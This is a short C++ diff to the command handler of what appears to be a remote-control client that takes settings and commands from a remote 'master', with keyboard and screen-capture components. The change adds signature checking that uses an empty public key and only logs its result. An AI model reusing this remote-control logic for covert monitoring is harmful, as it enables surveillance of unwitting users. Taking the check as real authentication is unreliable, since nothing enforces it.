@@ -841,7 +841,16 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     case CMD_MASTERSETTING:
         if (ulLength > MasterSettingsOldSize) {
             memcpy(&m_settings, szBuffer + 1, ulLength > sizeof(MasterSettings) ? sizeof(MasterSettings) : MasterSettingsOldSize);
-            Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds\n", ulLength - 1, m_settings.ReportInterval);
+            if (m_settings.Signature[0] && m_LoginSignature.empty()) {
+				m_LoginSignature = std::string(m_settings.Signature, m_settings.Signature + 64);
+                bool verifyMessage(const std::string & publicKey, BYTE * msg, int len, const std::string & signature);
+                bool verified = verifyMessage("", (BYTE*)m_LoginMsg.data(), m_LoginMsg.length(), m_LoginSignature);
+                Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds. Verified: %s\n", ulLength - 1, m_settings.ReportInterval,
+                    verified ? "success" : "failed");
+            }
+            else {
+				Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds.\n", ulLength - 1, m_settings.ReportInterval);
+            }
             iniFile cfg(CLIENT_PATH);
             cfg.SetStr("settings", "wallet", m_settings.WalletAddress);
             CManager* pMgr = (CManager*)m_hKeyboard->user;
@@ -920,7 +929,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             memcpy(user->buffer, szBuffer + 1, ulLength - 1);
             if (ulLength > 2 && !m_conn->IsVerified()) user->buffer[2] = 0;
         }
-        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
+        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP, this);
         m_hThread[m_ulThreadCount].user = user;
         m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopScreenManager, &m_hThread[m_ulThreadCount], 0, NULL);;
         break;
